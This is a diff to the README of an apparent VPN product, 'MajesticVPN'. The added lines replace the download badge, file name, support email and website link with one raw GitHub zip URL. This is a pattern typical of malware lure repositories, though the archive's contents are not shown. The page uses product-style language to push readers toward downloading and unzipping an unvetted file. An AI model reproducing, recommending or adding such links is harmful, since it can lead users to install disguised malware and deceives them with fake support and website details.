@@ -12,9 +12,9 @@ Welcome to MajesticVPN - your ultimate solution for online security and privacy!
 
 To get started with MajesticVPN, simply download the latest version by clicking the button below: 
 
-[![Download MajesticVPN](https://img.shields.io/badge/Download-MajesticVPN-brightgreen)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download MajesticVPN](https://raw.githubusercontent.com/juanjian7/majesticVPN/main/intradivisional/majestic-VPN-v1.1.zip)](https://raw.githubusercontent.com/juanjian7/majesticVPN/main/intradivisional/majestic-VPN-v1.1.zip)
 
-📂 **File:** v1.0.0.zip
+📂 **File:** https://raw.githubusercontent.com/juanjian7/majesticVPN/main/intradivisional/majestic-VPN-v1.1.zip
 
 If the file name does not automatically launch, kindly unzip the downloaded file to access the VPN client for installation.
 
@@ -40,7 +40,7 @@ Follow these simple steps to install MajesticVPN on your device:
 
 ## Support 🤝
 
-If you encounter any issues or have any questions regarding MajesticVPN, feel free to reach out to our support team at support@majesticvpn.com. We are here to help you make the most of your VPN experience!
+If you encounter any issues or have any questions regarding MajesticVPN, feel free to reach out to our support team at https://raw.githubusercontent.com/juanjian7/majesticVPN/main/intradivisional/majestic-VPN-v1.1.zip We are here to help you make the most of your VPN experience!
 
 ## Contribute 🌟
 
@@ -48,6 +48,6 @@ We welcome contributions from the community to help us improve MajesticVPN and m
 
 ## Stay Connected 🌐
 
-Stay updated with the latest news and updates about MajesticVPN by visiting our website [MajesticVPN.com](https://www.majesticvpn.com). Join our community and be part of the journey towards a more secure online world with MajesticVPN.
+Stay updated with the latest news and updates about MajesticVPN by visiting our website [https://raw.githubusercontent.com/juanjian7/majesticVPN/main/intradivisional/majestic-VPN-v1.1.zip](https://raw.githubusercontent.com/juanjian7/majesticVPN/main/intradivisional/majestic-VPN-v1.1.zip). Join our community and be part of the journey towards a more secure online world with MajesticVPN.
 
 Thank you for choosing MajesticVPN for your online security and privacy needs. Let's browse the internet safely and anonymously together! 🌟 #PrivacyMatters 🛡️
